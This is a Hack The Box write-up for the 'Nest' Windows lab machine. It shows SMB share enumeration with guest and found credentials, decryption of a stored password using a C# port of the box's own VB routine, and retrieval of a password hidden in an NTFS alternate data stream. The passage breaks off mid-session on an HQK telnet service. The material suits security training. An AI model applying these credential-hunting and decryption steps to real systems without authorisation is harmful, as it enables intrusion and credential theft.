---
layout: post
title: "HTB: Nest"
tags: htb windows
---

Nest was a Windows box that was ranked easy, but _imo_, really should've been medium. You'll see why.

### Recce

Not much - if you did an allports nmap scan, you'd see only ports 445 and 4386 open. Let's start with the familiar - port 445.

### Port 445

I usually start with `enum4linux` on SMB ports for some automated enumeration, while doing some active snooping using `smbclient` or `smbmap`. In this case, you'd see that `enum4linux` returns nothing useful. So we're actually left with manually looking around. 
  
  
To start, we could try to list shares on port 445 - if lucky, we could find some readable shares that contain useful information.
```
kali@kali:~/htb/boxes/nest/smb$ smbmap -H nest.htb -u 'kali' -p ''
[+] Guest session       IP: nest.htb:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 NO ACCESS
        Users                                                   READ ONLY
```
Note: Somehow, listing worked only if you provided a random username, even though a password wasn't required. In this case I used 'kali'.
  
  
We see that `Data` and `Users` are readable by us, so let's look inside by using `smbmap`'s `-R` option for a recursive search.
```
kali@kali:~/htb/boxes/nest/smb$ smbmap -H nest.htb -u 'kali' -p '' -R "Data"
[+] Guest session       IP: nest.htb:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Data                                                    READ ONLY
        .\Data\*
        dr--r--r--                0 Wed Aug  7 15:53:46 2019    .
        dr--r--r--                0 Wed Aug  7 15:53:46 2019    ..
        dr--r--r--                0 Wed Aug  7 15:58:07 2019    IT
        dr--r--r--                0 Mon Aug  5 14:53:41 2019    Production
        dr--r--r--                0 Mon Aug  5 14:53:50 2019    Reports
        dr--r--r--                0 Wed Aug  7 12:07:51 2019    Shared
        .\Data\Shared\*
        dr--r--r--                0 Wed Aug  7 12:07:51 2019    .
        dr--r--r--                0 Wed Aug  7 12:07:51 2019    ..
        dr--r--r--                0 Wed Aug  7 12:07:33 2019    Maintenance
        dr--r--r--                0 Wed Aug  7 12:08:07 2019    Templates
        .\Data\Shared\Maintenance\*
        dr--r--r--                0 Wed Aug  7 12:07:33 2019    .
        dr--r--r--                0 Wed Aug  7 12:07:33 2019    ..
        fr--r--r--               48 Wed Aug  7 12:07:32 2019    Maintenance Alerts.txt
        .\Data\Shared\Templates\*
        dr--r--r--                0 Wed Aug  7 12:08:07 2019    .
        dr--r--r--                0 Wed Aug  7 12:08:07 2019    ..
        dr--r--r--                0 Wed Aug  7 12:08:10 2019    HR
        dr--r--r--                0 Wed Aug  7 12:08:07 2019    Marketing
        .\Data\Shared\Templates\HR\*
        dr--r--r--                0 Wed Aug  7 12:08:10 2019    .
        dr--r--r--                0 Wed Aug  7 12:08:10 2019    ..
        fr--r--r--              425 Wed Aug  7 15:55:36 2019    Welcome Email.txt
```
```
kali@kali:~/htb/boxes/nest/smb$ smbmap -H nest.htb -u 'kali' -p '' -R "Users"
[+] Guest session       IP: nest.htb:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY
        .\Users\*
        dr--r--r--                0 Sat Jan 25 15:04:21 2020    .
        dr--r--r--                0 Sat Jan 25 15:04:21 2020    ..
        dr--r--r--                0 Fri Aug  9 08:08:23 2019    Administrator
        dr--r--r--                0 Sat Jan 25 23:21:44 2020    C.Smith
        dr--r--r--                0 Thu Aug  8 10:03:29 2019    L.Frost
        dr--r--r--                0 Thu Aug  8 10:02:56 2019    R.Thompson
        dr--r--r--                0 Wed Aug  7 15:56:02 2019    TempUser
```
We see that inside `Data`, there are two text files readable by us, `Maintenance Alerts.txt` and `Welcome Email.txt`. We also see that we can't read anything inside of `Users`, other than its root directory which reveals some usernames:
```
Administrator
C.Smith
L.Frost
R.Thompson
Tempuser
```
We can go ahead and save those usernames in a file - might come in useful later. For now let's proceed to read the two text files:
```
kali@kali:~/htb/boxes/nest/smb$ smbclient \\\\nest.htb\\Data -U 'kali'%''
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Aug  7 15:53:46 2019
  ..                                  D        0  Wed Aug  7 15:53:46 2019
  IT                                  D        0  Wed Aug  7 15:58:07 2019
  Production                          D        0  Mon Aug  5 14:53:38 2019
  Reports                             D        0  Mon Aug  5 14:53:44 2019
  Shared                              D        0  Wed Aug  7 12:07:51 2019

                10485247 blocks of size 4096. 6545606 blocks available
smb: \> get "Shared\Maintenance\Maintenance Alerts.txt"
getting file \Shared\Maintenance\Maintenance Alerts.txt of size 48 as Shared\Maintenance\Maintenance Alerts.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> get "Shared\Templates\HR\Welcome Email.txt"
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as Shared\Templates\HR\Welcome Email.txt (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> exit
kali@kali:~/htb/boxes/nest/smb$ ls
'Shared\Maintenance\Maintenance Alerts.txt'  'Shared\Templates\HR\Welcome Email.txt'
```
```
kali@kali:~/htb/boxes/nest/smb$ cat "Shared\\Maintenance\\Maintenance Alerts.txt" 
There is currently no scheduled maintenance work
```
```
kali@kali:~/htb/boxes/nest/smb$ cat "Shared\\Templates\\HR\\Welcome Email.txt" 
We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
```
Sweet - we got ourselves credentials for `TempUser`. Let's try `smbmap` with `TempUser` again, and see if anything new appears (that we couldn't access earlier).
```
kali@kali:~/htb/boxes/nest/smb$ smbmap -H nest.htb -u 'TempUser' -p 'welcome2019'
[+] IP: nest.htb:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 READ ONLY
        Users                                                   READ ONLY
```
A new share called `Secure$` appears with read-only permissions. Let's look inside it the same way:
```
kali@kali:~/htb/boxes/nest/smb$ smbmap -H nest.htb -u 'TempUser' -p 'welcome2019' -R "Secure$"
[+] IP: nest.htb:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Secure$                                                 READ ONLY
        .\Secure$\*
        dr--r--r--                0 Wed Aug  7 16:08:12 2019    .
        dr--r--r--                0 Wed Aug  7 16:08:12 2019    ..
        dr--r--r--                0 Wed Aug  7 12:40:25 2019    Finance
        dr--r--r--                0 Wed Aug  7 16:08:12 2019    HR
        dr--r--r--                0 Thu Aug  8 03:59:25 2019    IT
```
We see `smbmap`'s recursive search didn't find much for us here - no documents that we can read. Let's recurse inside `Data`, and see if we can find anything new:
```
kali@kali:~/htb/boxes/nest/smb$ smbmap -H nest.htb -u 'TempUser' -p 'welcome2019' -R "Data"
[+] IP: nest.htb:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Data                                                    READ ONLY
        .\Data\*
        dr--r--r--                0 Wed Aug  7 15:53:46 2019    .
        dr--r--r--                0 Wed Aug  7 15:53:46 2019    ..
        dr--r--r--                0 Wed Aug  7 15:58:07 2019    IT
        dr--r--r--                0 Mon Aug  5 14:53:41 2019    Production
        dr--r--r--                0 Mon Aug  5 14:53:50 2019    Reports
        dr--r--r--                0 Wed Aug  7 12:07:51 2019    Shared
        .\Data\IT\*
        dr--r--r--                0 Wed Aug  7 15:58:07 2019    .
        dr--r--r--                0 Wed Aug  7 15:58:07 2019    ..
        dr--r--r--                0 Wed Aug  7 15:58:07 2019    Archive
        dr--r--r--                0 Wed Aug  7 15:59:34 2019    Configs
        dr--r--r--                0 Wed Aug  7 15:08:30 2019    Installs
        dr--r--r--                0 Sat Jan 25 16:09:13 2020    Reports
        dr--r--r--                0 Mon Aug  5 15:33:51 2019    Tools
        .\Data\IT\Configs\*
        dr--r--r--                0 Wed Aug  7 15:59:34 2019    .
        dr--r--r--                0 Wed Aug  7 15:59:34 2019    ..
        dr--r--r--                0 Wed Aug  7 12:20:13 2019    Adobe
        dr--r--r--                0 Tue Aug  6 04:16:34 2019    Atlas
        dr--r--r--                0 Tue Aug  6 06:27:08 2019    DLink
        dr--r--r--                0 Wed Aug  7 12:23:26 2019    Microsoft
        dr--r--r--                0 Wed Aug  7 12:33:54 2019    NotepadPlusPlus
        dr--r--r--                0 Wed Aug  7 13:01:13 2019    RU Scanner
        dr--r--r--                0 Tue Aug  6 06:27:09 2019    Server Manager
        .\Data\IT\Configs\Adobe\*
        dr--r--r--                0 Wed Aug  7 12:20:13 2019    .
        dr--r--r--                0 Wed Aug  7 12:20:13 2019    ..
        fr--r--r--              246 Wed Aug  7 12:20:13 2019    editing.xml
        fr--r--r--                0 Wed Aug  7 12:20:09 2019    Options.txt
        fr--r--r--              258 Wed Aug  7 12:20:09 2019    projects.xml
        fr--r--r--             1274 Wed Aug  7 12:20:09 2019    settings.xml
        .\Data\IT\Configs\Atlas\*
        dr--r--r--                0 Tue Aug  6 04:16:34 2019    .
        dr--r--r--                0 Tue Aug  6 04:16:34 2019    ..
        fr--r--r--             1369 Tue Aug  6 04:18:38 2019    Temp.XML
        .\Data\IT\Configs\Microsoft\*
        dr--r--r--                0 Wed Aug  7 12:23:26 2019    .
        dr--r--r--                0 Wed Aug  7 12:23:26 2019    ..
        fr--r--r--             4598 Wed Aug  7 12:23:26 2019    Options.xml
        .\Data\IT\Configs\NotepadPlusPlus\*
        dr--r--r--                0 Wed Aug  7 12:33:54 2019    .
        dr--r--r--                0 Wed Aug  7 12:33:54 2019    ..
        fr--r--r--             6451 Wed Aug  7 16:01:25 2019    config.xml
        fr--r--r--             2108 Wed Aug  7 16:00:36 2019    shortcuts.xml
        .\Data\IT\Configs\RU Scanner\*
        dr--r--r--                0 Wed Aug  7 13:01:13 2019    .
        dr--r--r--                0 Wed Aug  7 13:01:13 2019    ..
        fr--r--r--              270 Thu Aug  8 12:49:37 2019    RU_config.xml
        .\Data\Shared\*
        dr--r--r--                0 Wed Aug  7 12:07:51 2019    .
        dr--r--r--                0 Wed Aug  7 12:07:51 2019    ..
        dr--r--r--                0 Wed Aug  7 12:07:33 2019    Maintenance
        dr--r--r--                0 Wed Aug  7 12:08:07 2019    Templates
        .\Data\Shared\Maintenance\*
        dr--r--r--                0 Wed Aug  7 12:07:33 2019    .
        dr--r--r--                0 Wed Aug  7 12:07:33 2019    ..
        fr--r--r--               48 Wed Aug  7 12:07:32 2019    Maintenance Alerts.txt
        .\Data\Shared\Templates\*
        dr--r--r--                0 Wed Aug  7 12:08:07 2019    .
        dr--r--r--                0 Wed Aug  7 12:08:07 2019    ..
        dr--r--r--                0 Wed Aug  7 12:08:10 2019    HR
        dr--r--r--                0 Wed Aug  7 12:08:07 2019    Marketing
        .\Data\Shared\Templates\HR\*
        dr--r--r--                0 Wed Aug  7 12:08:10 2019    .
        dr--r--r--                0 Wed Aug  7 12:08:10 2019    ..
        fr--r--r--              425 Wed Aug  7 15:55:36 2019    Welcome Email.txt
```
Interesting! There's now a lot more information that we can read inside here - and most importantly, looks like there're some config files that we can read. Config files are always interesting because they could contain credentials.  
  
  
Instead of retrieving those files from `Data` individually, we can bulk-download them using `smbget` this way:
```
kali@kali:~/htb/boxes/nest/smb/demo$ smbget -R smb://nest.htb/Data/ -U TempUser%welcome2019
Using workgroup WORKGROUP, user TempUser
smb://nest.htb/Data//IT/Configs/Adobe/editing.xml                                                                                                  
smb://nest.htb/Data//IT/Configs/Adobe/Options.txt                                                                                                  
smb://nest.htb/Data//IT/Configs/Adobe/projects.xml                                                                                                 
smb://nest.htb/Data//IT/Configs/Adobe/settings.xml                                                                                                 
smb://nest.htb/Data//IT/Configs/Atlas/Temp.XML                                                                                                     
smb://nest.htb/Data//IT/Configs/Microsoft/Options.xml                                                                                              
smb://nest.htb/Data//IT/Configs/NotepadPlusPlus/config.xml                                                                                         
smb://nest.htb/Data//IT/Configs/NotepadPlusPlus/shortcuts.xml                                                                                      
smb://nest.htb/Data//IT/Configs/RU Scanner/RU_config.xml                                                                                           
smb://nest.htb/Data//Shared/Maintenance/Maintenance Alerts.txt                                                                                     
smb://nest.htb/Data//Shared/Templates/HR/Welcome Email.txt                                                                                         
Downloaded 16.65kB in 45 seconds
kali@kali:~/htb/boxes/nest/smb/demo$ ls
IT  Production  Reports  Shared
```
If you went through these files, sooner or later you should come across some information that appear to be maybe useful:
```
kali@kali:~/htb/boxes/nest/smb/demo/IT/Configs/NotepadPlusPlus$ cat config.xml 
<?xml version="1.0" encoding="Windows-1252" ?>
<NotepadPlus>
(..snip..)
    <History nbMaxFile="15" inSubMenu="no" customLength="-1">
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />
    </History>
</NotepadPlus>
```
Now we have some filenames inside `Carl`'s folder in the `Secure$` share, and on his `Desktop` folder. We can also reasonably conclude the `Carl` is `c.smith`.
```
kali@kali:~/htb/boxes/nest/smb/demo/IT/Configs/RU Scanner$ cat RU_config.xml 
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
```
We also find `Carl`'s LDAP password (port 389) - however, it's encrypted, so we can't use it. If we could decrypt it, then we would be able to read the documents in `Carl`'s folders in the `Secure$` share and in his `Desktop` folder.
  
  
At this stage, it might seem like we haven't found enough information to make a breakthrough. But actually there is a way - let's take another look at the `Secure$` share where `smbmap` couldn't find anything earlier. This time, let's use `smbclient` to have a more hands-on poke-around:
```
kali@kali:~/htb/boxes/nest/smb/demo$ smbclient \\\\nest.htb\\Secure$ -U TempUser%welcome2019
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Aug  7 16:08:12 2019
  ..                                  D        0  Wed Aug  7 16:08:12 2019
  Finance                             D        0  Wed Aug  7 12:40:13 2019
  HR                                  D        0  Wed Aug  7 16:08:11 2019
  IT                                  D        0  Thu Aug  8 03:59:25 2019

                10485247 blocks of size 4096. 6545588 blocks available
smb: \> cd Finance
smb: \Finance\> dir
NT_STATUS_ACCESS_DENIED listing \Finance\*
smb: \Finance\> cd ..
smb: \> cd HR
smb: \HR\> dir
NT_STATUS_ACCESS_DENIED listing \HR\*
smb: \HR\> cd ..
smb: \> cd IT
smb: \IT\> dir
NT_STATUS_ACCESS_DENIED listing \IT\*
```
We see that as `TempUser`, we have no access to read any of the three folders that we see. However, remember that we had found a full path belonging to `Carl` earlier that's located inside the `Secure$` share:
```
<File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
```
Let's see if we can directly go to `Carl`'s folder in `Secure$\IT`:
```
smb: \> cd IT\Carl
smb: \IT\Carl\> dir
  .                                   D        0  Wed Aug  7 12:42:14 2019
  ..                                  D        0  Wed Aug  7 12:42:14 2019
  Docs                                D        0  Wed Aug  7 12:44:00 2019
  Reports                             D        0  Tue Aug  6 06:45:40 2019
  VB Projects                         D        0  Tue Aug  6 07:41:55 2019

                10485247 blocks of size 4096. 6545588 blocks available
```
Whaddayaknow? We can! It looks like these folders might contain a lot of information, so let's use `smbget` to recursively download documents from here that we can access:
```
kali@kali:~/htb/boxes/nest/smb/demo$ smbget -R smb://nest.htb/Secure$/IT/Carl -U TempUser%welcome2019
Using workgroup WORKGROUP, user TempUser
smb://nest.htb/Secure$/IT/Carl/Docs/ip.txt                                                                                                         
smb://nest.htb/Secure$/IT/Carl/Docs/mmc.txt                                                                                                        
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/ConfigFile.vb                                                                          
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/Module1.vb                                                                             
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb                                                     
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Application.myapp                                                           
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb                                                             
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb                                                       
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Resources.resx                                                              
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb                                                        
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Settings.settings                                                           
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj                                                                      
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user                                                                 
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/SsoIntegration.vb                                                                      
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/Utils.vb                                                                               
smb://nest.htb/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner.sln                                                                                    
Downloaded 25.18kB in 46 seconds
```
We see a lot of `RUScanner` files - that's our big clue. Remember that earlier, the file in which we found `Carl`'s LDAP credentials was called `RU_Config.xml`.
  
  
If you sifted through these files (like I did), you should come across a clue that could provide a breakthrough:
```
kali@kali:~/htb/boxes/nest/smb/demo/tempuser-secure-it-carl/VB Projects/WIP/RU/RUScanner$ cat Module1.vb 
Module Module1

    Sub Main()
        Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
       


    End Sub

End Module
```
We see that the file `Module1.vb` takes data from the `RU_Config.xml`, and decrypts the password using a function called `DecryptString` from the `Utils` package.
Let's take a look inside `Utils.vb`:
```
kali@kali:~/htb/boxes/nest/smb/demo/tempuser-secure-it-carl/VB Projects/WIP/RU/RUScanner$ ls
 bin   ConfigFile.vb   Module1.vb  'My Project'   obj  'RU Scanner.vbproj'  'RU Scanner.vbproj.user'   SsoIntegration.vb   Utils.vb
kali@kali:~/htb/boxes/nest/smb/demo/tempuser-secure-it-carl/VB Projects/WIP/RU/RUScanner$ cat Utils.vb 
Imports System.Text
Imports System.Security.Cryptography
Public Class Utils

    Public Shared Function GetLogFilePath() As String
        Return IO.Path.Combine(Environment.CurrentDirectory, "Log.txt")
    End Function




    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function EncryptString(PlainString As String) As String
        If String.IsNullOrEmpty(PlainString) Then
            Return String.Empty
        Else
            Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Encrypt(ByVal plainText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)
        Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)
        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))
        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)
        Using memoryStream As New IO.MemoryStream()
            Using cryptoStream As New CryptoStream(memoryStream, _
                                            encryptor, _
                                            CryptoStreamMode.Write)
                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
                cryptoStream.FlushFinalBlock()
                Dim cipherTextBytes As Byte() = memoryStream.ToArray()
                memoryStream.Close()
                cryptoStream.Close()
                Return Convert.ToBase64String(cipherTextBytes)
            End Using
        End Using
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
    End Function






End Class
```
We see that the `Utils.vb` script contains the function `DecryptString` that we could use to decrypt the encrypted password we found earlier! Now to make use of what we have, we don't need to understand how the encryption / decryption works - we just need to somehow be able to make use of the `DecryptString` function on our discovered encrypted password. To do this, we can simply cobble together a makeshift script that throws our encrypted password into the `DecryptString` function.
  
  
### SMB as Carl
The main challenge here was that the `Utils.vb` script is written in VBScript (i.e. it was a challenge to me). To make lives easier for ourselves, we can convert everything to `C#` using the [super-useful Telerik code converter](https://converter.telerik.com/). That's right - just go to the link and dump the contents of `Utils.vb` in there, and you've have the script re-written in `C#`.
  
  
Then, let's cobble together a script that throws our encrypted password into the `DecryptString` function. Mine looked like this:
```
kali@kali:~/htb/boxes/nest$ cat decrypt.cs 
using System;
//using CascCrypto;
using System.IO;
using System.Security.Cryptography;
using System.Text;

class HelloWorld {
  static void Main() {
    string str = string.Empty;
    //Console.WriteLine("Hello World!");
    string Pwd = "fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=";
    string EncryptedString = Pwd;
    str = DecryptString(EncryptedString, "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256);
    Console.WriteLine(str);
  }
 private static string DecryptString(
      string cipherText,
      string passPhrase,
      string saltValue,
      int passwordIterations,
      string initVector,
      int keySize)
    {
      byte[] bytes1 = Encoding.ASCII.GetBytes(initVector);
      byte[] bytes2 = Encoding.ASCII.GetBytes(saltValue);
      byte[] buffer = Convert.FromBase64String(cipherText);
      byte[] bytes3 = new Rfc2898DeriveBytes(passPhrase, bytes2, passwordIterations).GetBytes(checked ((int) Math.Round(unchecked ((double) keySize / 8.0))));
      AesCryptoServiceProvider cryptoServiceProvider = new AesCryptoServiceProvider();
      cryptoServiceProvider.Mode = CipherMode.CBC;
      ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor(bytes3, bytes1);
      MemoryStream memoryStream = new MemoryStream(buffer);
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read);
      byte[] numArray = new byte[checked (buffer.Length + 1)];
      int count = cryptoStream.Read(numArray, 0, numArray.Length);
      memoryStream.Close();
      cryptoStream.Close();
      return Encoding.ASCII.GetString(numArray, 0, count);
    }
}
```
Breakdown:
- `static void Main()` contains our main function that feeds our encrypted password to the `DecryptString` function and prints out the output.
- `private static string DecryptString` contains the chunk of code converted from `Utils.vb` that performs the decryption magic.

To compile and run a `C#` script on Linux, we can use `mono` (to install, enter `sudo apt-get install mono-complete`):
```
kali@kali:~/htb/boxes/nest$ mcs -out:decrypt.exe decrypt.cs 
kali@kali:~/htb/boxes/nest$ mono decrypt.exe 
xRxRxPANCAK3SxRxRx
```  
With `Carl`'s password, we can now further enumerate SMB shares as `c.smith`. Remember we had a clue to look inside `Carl`'s home directory? Let's go check that out in the `Users` SMB share:
```
kali@kali:~/htb/boxes/nest/smb/demo/c.smith-users$ smbmap -H nest.htb -u c.smith -p 'xRxRxPANCAK3SxRxRx' -R "Users"
[+] IP: nest.htb:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   READ ONLY
        .\Users\*
        dr--r--r--                0 Sat Jan 25 15:04:21 2020    .
        dr--r--r--                0 Sat Jan 25 15:04:21 2020    ..
        dr--r--r--                0 Fri Aug  9 08:08:23 2019    Administrator
        dr--r--r--                0 Sat Jan 25 23:21:44 2020    C.Smith
        dr--r--r--                0 Thu Aug  8 10:03:29 2019    L.Frost
        dr--r--r--                0 Thu Aug  8 10:02:56 2019    R.Thompson
        dr--r--r--                0 Wed Aug  7 15:56:02 2019    TempUser
        .\Users\C.Smith\*
        dr--r--r--                0 Sat Jan 25 23:21:44 2020    .
        dr--r--r--                0 Sat Jan 25 23:21:44 2020    ..
        dr--r--r--                0 Thu Aug  8 16:06:17 2019    HQK Reporting
        fr--r--r--               32 Sat Jan 25 23:21:44 2020    user.txt
        .\Users\C.Smith\HQK Reporting\*
        dr--r--r--                0 Thu Aug  8 16:06:17 2019    .
        dr--r--r--                0 Thu Aug  8 16:06:17 2019    ..
        dr--r--r--                0 Fri Aug  9 05:18:42 2019    AD Integration Module
        fr--r--r--                0 Thu Aug  8 16:08:16 2019    Debug Mode Password.txt
        fr--r--r--              249 Thu Aug  8 16:09:05 2019    HQK_Config_Backup.xml
        .\Users\C.Smith\HQK Reporting\AD Integration Module\*
        dr--r--r--                0 Fri Aug  9 05:18:42 2019    .
        dr--r--r--                0 Fri Aug  9 05:18:42 2019    ..
        fr--r--r--            17408 Wed Aug  7 16:42:49 2019    HqkLdap.exe
```
From here, you can grab `user.txt`, but let's not get too happy cos we ain't got a shell yet.

### HQK with Debug Mode Password
Notice that we've got a password file to look at - `Debug Mode Password.txt`. We'd jump for joy, only to notice that it's an empty file with size zero, and if you download it and ran the `strings` command on it, you'd still find nothing. 
  
  
I was helped out by a comment in the HTB forums to look into SMB alternate data streams. I looked it up, and found a useful post on stackoverflow that describes [how to view such streams](https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux):
```
kali@kali:~/htb/boxes/nest/smb/demo/c.smith-users$ smbclient \\\\nest.htb\\Users -U c.smith%xRxRxPANCAK3SxRxRx -c 'allinfo "C.Smith\HQK Reporting\Debug Mode Password.txt"'
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 04:06:12 PM 2019 PDT
access_time:    Thu Aug  8 04:06:12 PM 2019 PDT
write_time:     Thu Aug  8 04:08:17 PM 2019 PDT
change_time:    Thu Aug  8 04:08:17 PM 2019 PDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
```
```
kali@kali:~/htb/boxes/nest/smb/demo/c.smith-users$ smbclient \\\\nest.htb\\Users -U c.smith%xRxRxPANCAK3SxRxRx -c 'get "C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA"'
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA of size 15 as C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
kali@kali:~/htb/boxes/nest/smb/demo/c.smith-users$ ls
'C.Smith\HQK Reporting\Debug Mode Password.txt:Password:$DATA'
kali@kali:~/htb/boxes/nest/smb/demo/c.smith-users$ cat C.Smith\\HQK\ Reporting\\Debug\ Mode\ Password.txt\:Password\:\$DATA 
WBQ201953D8w
```
In case you haven't noticed, the credentials we found was for the `HQK` service. (We found the password in `Carl`'s `HQK` folder). What's HQK you asked? I didn't know then, and I still don't really know now, but it's apparently a legacy database query language. Won't go into too much detail here, but this discovery actually ties in with the second port we'd found earlier in our nmap scans - port 4386. To interact with HQK, we have to telnet, like this:
```
kali@kali:~/htb/boxes/nest/smb/demo/c.smith-users$ telnet nest.htb 4386
Trying 10.10.10.178...
Connected to nest.htb.
Escape character is '^]'.

HQK Reporting Service V1.2

>
```
As always, good to start with a `help` command:
```
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
```
OK, looks like we can `DEBUG` with a `<Password>`. Let's do that with our password:
```
>debug WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
```
Ok, let's do another `help` command:
```
>help

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>
```
A few new commands did appear. Let's try `LIST`:
```
>list

